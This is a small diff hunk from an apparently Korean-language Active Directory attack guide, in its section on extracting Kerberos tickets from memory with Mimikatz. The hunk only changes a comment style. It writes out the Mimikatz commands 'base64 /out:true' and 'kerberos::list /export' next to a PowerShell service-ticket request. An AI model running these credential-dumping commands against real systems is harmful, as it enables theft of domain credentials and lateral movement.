@@ -439,7 +439,7 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
 
 ### Mimikatz를 사용하여 메모리에서 티켓 추출
 ```
-mimikatz # base64 /out:true    <== 이 명령 생략하면 kirbi 파일 바로 저장 
+mimikatz # base64 /out:true    # 이 명령 생략하면 kirbi 파일 바로 저장 
 mimikatz # kerberos::list /export
 ```
 
